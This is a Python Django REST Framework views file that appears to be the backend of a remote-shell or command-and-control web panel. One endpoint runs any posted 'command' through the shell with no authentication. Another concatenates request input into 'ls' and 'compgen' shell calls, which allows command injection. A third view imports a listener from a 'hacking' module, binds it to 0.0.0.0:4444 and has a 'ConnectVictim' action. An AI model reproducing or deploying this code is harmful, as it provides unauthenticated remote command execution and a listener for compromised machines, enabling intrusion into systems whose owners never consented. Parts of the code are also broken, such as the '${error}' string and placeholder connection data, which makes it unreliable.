from rest_framework.views import APIView
from rest_framework.response import Response
from rest_framework.permissions import AllowAny
import subprocess, os, sys

from rest_framework.response import Response
from rest_framework.views import APIView
import argparse
# import argcomplete
import subprocess

from hacking.Lisener import Server

class ExecuteCommandView(APIView):
    permission_classes = [AllowAny, ]
    
    def post(self, request):
        command =  request.data.get('command')
        arr = command.split(" ")
        output = ""
        

        try:        
            if arr[0]=="cd" and len(arr) > 1:
                os.chdir(arr[1])
                output = os.getcwd()
            elif arr[0]=="location_dir":
                ""
            else:
                command = command.encode()
                DEVNULL=open(os.devnull, 'wb')
                output = subprocess.check_output(command, shell=True,  stderr=DEVNULL, stdin=DEVNULL)
                output = output.decode()
        
            
        except:
            
            output = 'Error execute: ${error}\r\n'
        
        loc = os.getcwd();      
        loc_list = loc.split('/')        
        loc = loc.replace(loc_list[0]+"/"+loc_list[1]+"/"+loc_list[2], "")
        location_dir =  loc_list[2]+"@" + loc +">> "         
        return Response({'output': output, 'location_dir': location_dir})


class AutoCompleteView(APIView):
    def post(self, request):
        command_prefix =  request.data.get('command')
        arr = command_prefix.split(" ")
        if arr[0]=="cd" and len(arr) > 1:
            dir = arr[1].split("/")
            path = arr[1]
            pathFind = dir.pop()          
            if not pathFind == "":
                path = path.replace("/"+pathFind,"")
            
            
            DEVNULL=open(os.devnull, 'wb')
            listobject = subprocess.check_output("ls " + path, shell=True,  stderr=DEVNULL, 
                                               stdin=DEVNULL).decode().split("\n")
            
            completions = [c for c in listobject if c.startswith(pathFind)]
             
        else:
            completions = subprocess.run(['bash', '-c', f'compgen -A command {command_prefix}'], capture_output=True, text=True)
            completions = completions.stdout.strip().split("\n")
            completions = list(set(completions))
            
        completions.sort()
        completions = completions[0:7]
        
        return Response({'completions': completions})


class Connect(APIView):
    permission_classes = [AllowAny, ]
    
    def __init__(self):
        self.server = Server
            
        
    
    def post(self, request):
        action =  request.data.get('action')
        
        if action == "connect":
            try:
                self.server = Server("0.0.0.0", "4444")
                result = True
                print("True")
                self.server.receive()
                
            except Exception:
                result = False
                sys.exit()
                
        elif  action == "disconnect":   
            try:
                self.server.stop()
                result = True
            except Exception:
                result = False
                sys.exit()
                
        elif action == "ConnectVictim":   
            try:
                result = True
                self.server.stop()
            except Exception:
                result = False
                sys.exit()
    
        return Response({'result': result})
    
    def get(self, request):
        print(self.server)
        connections = ["self.server.clients"]
        return Response({'connections': connections})




# class AutoCompleteView(APIView):
#     def get(self, request, command_prefix):
#         parser = argparse.ArgumentParser(description='Command runner')
#         parser.add_argument('command', type=str, help='Command to run')
#         parser.add_argument('-o', '--options', type=str, nargs='*', help='Command options')
#         argcomplete.autocomplete(parser)
#         print(command_prefix)
#         args = parser.parse_args(command_prefix)
#         command = [args.command] + args.options
#         result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
#         return Response(result.stdout.decode())

# class AutoCompleteView(APIView):
#     def get(self, request, command_prefix):
#         command = request.GET.get('command')
#         result = subprocess.run(command_prefix, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
#         print(result)
#         completions = result.stdout.decode().strip().split("\n")
#         return Response({'completions': completions})